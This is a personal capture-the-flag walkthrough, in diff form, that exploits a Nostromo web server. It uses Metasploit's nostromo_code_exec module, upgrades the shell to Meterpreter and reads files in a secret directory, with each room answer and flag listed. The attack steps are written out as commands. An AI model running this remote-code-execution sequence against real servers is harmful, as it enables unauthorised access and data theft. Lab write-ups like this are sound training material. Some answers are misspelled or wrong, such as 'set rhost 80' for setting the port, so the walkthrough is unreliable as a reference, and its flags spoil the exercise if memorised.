@@ -1,0 +1,42 @@
+
+							      Final Walkthrough 
+							    =====================
+
+1. Select the module that needs to be exploited
+ans: use exploit/multi/http/nostromo_code_exec (already show in discription)
+command: msfconsole
+command: use exploit/multi/http/nostromo_code_exec
+
+2. What variable do you need to set, to select the remote host
+ans: rhsot
+
+3. How do you set the port to 80
+ans: set rhost 80
+
+4. How do you set listening address(Your machine)
+ans: lhost
+
+5. Exploit the machine!
+ans: auto-complete
+
+6. What is the name of the secret directory in the /var/nostromo/htdocs directory?
+ans: s3cretd1r
+command: set rhost ***.***.***.***
+command: set lhost ***.***.***.***
+command: exploit -j
+command: search multi/manage/shell_to_meterpreter
+command: use multi/manage/shell_to_meterpreter
+command: options
+command: set session (session number)
+command: run
+command: sessions
+command: sessions -i (session number)
+command: cd /var/nostromo/htdocs
+command: ls
+
+7. What are the contents of the file inside of the directory?
+ans: Woohoo!
+command: cd s3cretd1r
+command: ls
+command: cat nice
+
